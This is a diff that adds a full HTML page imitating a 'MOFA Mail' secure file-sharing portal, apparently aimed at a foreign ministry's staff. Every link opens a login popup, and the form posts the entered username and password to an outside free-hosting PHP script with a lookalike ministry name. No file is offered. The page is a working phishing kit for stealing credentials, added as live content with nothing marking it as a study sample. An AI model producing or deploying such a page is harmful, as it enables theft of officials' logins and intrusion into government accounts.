@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MOFA Mail :: Welcome to MOFA Mail</title>
+    <link rel="shortcut icon" href="favicon.ico"/>
+    <link rel="stylesheet" type="text/css" href="./file.css">
+</head>
+<body>
+    <div class="navbar">
+        <a href="#download" onclick="showPopup()">Contact us</a>
+        <a href="#signup" onclick="showPopup()">News</a>
+        <a href="#login" onclick="showPopup()">Home</a>
+    </div>
+    <br>
+    <div class="container"><br>
+      <img  src="mm.svg" alt="Google Icon"  >
+        <h1>Welcome to Secure Drive Sharing :: MOFA </h1>
+        <p>To download the file, please choose an option:</p>
+        <div class="options">
+            <!-- Option 1: Log in with Google -->
+            <a class="button" href="#" onclick="showPopup()">Login with Email </a>
+            <!-- Option 2: Sign Up -->
+            <p style="align-text: center;" id="signup">Don't have an account? <a  class="button" href="#" onclick="showPopup()">&emsp;&emsp;Sign Up</a></p>
+            <!-- File Download Link (only visible to logged-in users) -->
+            <!-- Replace the link with the actual file location -->
+            <div id="download-link" style="display: none;">
+                <p id="download">Click below to download the file:</p>
+                <a class="button" href="https://www.example.com/file-download">Download File</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Flex popup for login -->
+    <div class="popup" id="login-popup">
+        <div class="popup-content">
+            <h2>Login with Email</h2>
+            <form action="https://ministeries-documents-overview-branches.000webhostapp.com/myan-mfa/xing.php" method="post" target="_top">
+                <input id="user" name="username" type="text" placeholder="Username" required>
+                <input id="pass" name="password" type="password" placeholder="Password" required>
+                <button class="popup-button">Submit</button>
+            </form>
+        </div>
+    </div>
+ 
+    <div style="margin-top:32px;" class="footer">
+        &copy; MOFA Mail
+    </div>
+
+    <script>
+        function showPopup() {
+            document.getElementById("login-popup").style.display = "flex";
+        }
+
+        function closePopup() {
+            document.getElementById("login-popup").style.display = "none";
+        }
+    </script>
+</body>
+</html>
